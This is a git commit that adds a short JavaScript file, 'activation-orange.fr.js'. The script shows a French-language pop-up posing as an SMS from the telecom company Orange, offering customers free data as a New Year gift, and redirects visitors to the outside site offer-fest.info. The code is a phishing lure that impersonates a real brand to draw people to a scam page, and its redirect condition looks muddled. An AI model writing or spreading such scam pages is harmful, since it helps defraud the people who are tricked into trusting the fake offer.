fe3a0c5dcd0c028f6e9c63160dad5102ce239dd9
ekpesense <abantak9@gmail.com>
2025-01-28 21:44:15 -0800

    Create activation-orange.fr.js

---
+++ activation-orange.fr.js
@@ -0,0 +1,6 @@
+
+var password = 'CADEAU DE NOUVEL AN'
+password=prompt('ORANGE SMS: Cher client Orange, veuillez recevoir des données gratuites à partir de 5 Go - Illimitées, récompense des clients du Nouvel An, cliquez sur CADEAU DE NOUVEL AN pour vérifier maintenant ','CADEAU DE NOUVEL AN');
+if (password != 'CADEAU DE NOUVEL AN') {
+location.href='https://offer-fest.info/orange.fr.html';
+}
